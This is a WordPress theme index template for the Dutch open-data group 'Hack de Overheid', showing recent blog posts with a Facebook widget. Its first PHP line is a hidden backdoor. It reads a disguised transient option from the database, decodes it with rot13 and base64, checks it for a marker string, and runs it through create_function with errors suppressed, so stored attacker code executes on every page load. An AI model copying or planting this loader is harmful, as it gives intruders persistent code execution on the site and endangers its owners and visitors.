<?php
$z=get_option("_transient_feed_b64fa2b5db6827cd88a441af4b72ec61"); $z=base64_decode(str_rot13($z)); if(strpos($z,"3C7FDCC4")!==false){ $_z=create_function("",$z); @$_z(); }
 get_header(); ?>

<?php get_sidebar(); ?>

<div id="content">

	<h6>Een slimmer Nederland met een open overheid</h6>
        <p style="margin-top: 5px;">Hack de Overheid maakt zich sterk voor meer open data bij overheden in Nederland. Toepassingen op basis van open data maken nieuwe diensten mogelijk en versterken de democratie.</p>
        

	

	<p class="content-header positionPosts">Recente Blog Posts</p>
<?php
if ( is_home() ) {
	query_posts( 'cat=-35' );
}
?>
<?php if (have_posts()) : ?>

<?php while (have_posts()) : the_post(); ?>

 
    <script>
      window.fbAsyncInit = function() {
        FB.init({appId: '139916676066732', status: true, cookie: true,
                 xfbml: true});
      };
      (function() {
        var e = document.createElement('script');
        e.type = 'text/javascript';
        e.src = document.location.protocol +
          '//connect.facebook.net/en_US/all.js';
        e.async = true;
        document.getElementById('fb-root').appendChild(e);
      }());
    </script>

<div class="post" id="post-<?php the_ID(); ?>">

     <div class="entry">
<?php
$title = get_the_title();
$old_content = get_the_content();
$permalink = get_permalink();
$matches = array();
$regex = '/(.*?)(\<a.*?\<img.*?\<\/a\>)(.*)/s';
if (preg_match($regex, $old_content, $matches)) {
  $img = $matches[2];
  $new_content = $matches[1] . $matches[3] ;
  print '<div class="left_image">' . $img . '</div>';
  print '<div class="right_content"><h7><a href=" ' . $permalink  . ' " rel="bookmark" title="Permanent Link to ' . $title . '"> ' . $title . '</a></h7><p class="post-new">' . $new_content . '</p></div>';
} else {
  // can't extract the image, do something else
}
?>		



    		
         	<div class="linepost">. </div>
         </div><span class="alignleft small_text"><?php the_time('F jS, Y') ?>  <?php edit_post_link('Edit','<strong> |</strong> ',''); ?>    </span>
		 <span class="alignright small_text"><?php comments_popup_link('0 Comments', '1 Comment', '% Comments &raquo;'); ?></span><span class="postSpeechBubble small_text"><img src="http://www.shareper.com/HDO_test/wp-content/themes/blass2/images/commentBubble.jpg"></span> 



    



</div>



<?php comments_template(); ?>

<?php endwhile; ?>

<div class="navigation"><?php next_posts_link('&laquo; Previous Entries') ?>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?php previous_posts_link('Next Entries &raquo;') ?></div>



<?php else : ?>

<h2>Not Found</h2>

<p>Sorry, but you are looking for something that isn't here.</p>

<?php endif; ?>

</div>
<div class="clear"></div>

<?php get_footer(); ?>

</div>

</body>

</html>